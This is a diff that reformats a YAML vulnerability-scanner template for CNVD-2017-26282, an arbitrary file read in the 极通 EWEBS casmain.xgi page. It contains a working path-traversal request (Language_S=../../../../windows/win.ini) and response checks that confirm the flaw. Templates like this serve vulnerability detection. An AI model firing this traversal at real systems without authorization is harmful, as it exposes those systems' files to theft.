@@ -1,20 +1,20 @@
 id: CNVD-2017-26282
 
-info:  
+info:
   name: 极通webs 应用虚拟化系统 任意文件读取
   author: 陈麻子
-  severity: high    
-  verified: true  
-  description: |   
-   介绍: 极通EWEBS系统的casmain.xgi页面存在可控参数，导致攻击者可以访问任意系统文件，泄露的敏感信息。
-  reference: 
-  - https://vuls.info/PeiQi/wiki/webapp/%E6%9E%81%E9%80%9AEWEBS/%E6%9E%81%E9%80%9AEWEBS%20casmain.xgi%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/ 
+  severity: high
+  verified: true
+  description: |
+    介绍: 极通EWEBS系统的casmain.xgi页面存在可控参数，导致攻击者可以访问任意系统文件，泄露的敏感信息。
+  reference:
+    - https://vuls.info/PeiQi/wiki/webapp/%E6%9E%81%E9%80%9AEWEBS/%E6%9E%81%E9%80%9AEWEBS%20casmain.xgi%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/
 
-rules:  
-  r0:  
-    request: 
-      method: POST     
+rules:
+  r0:
+    request:
+      method: POST
       path: /casmain.xgi
-      body: Language_S=../../../../windows/win.ini 
+      body: Language_S=../../../../windows/win.ini
     expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
-expression:  r0()   
+expression: r0()
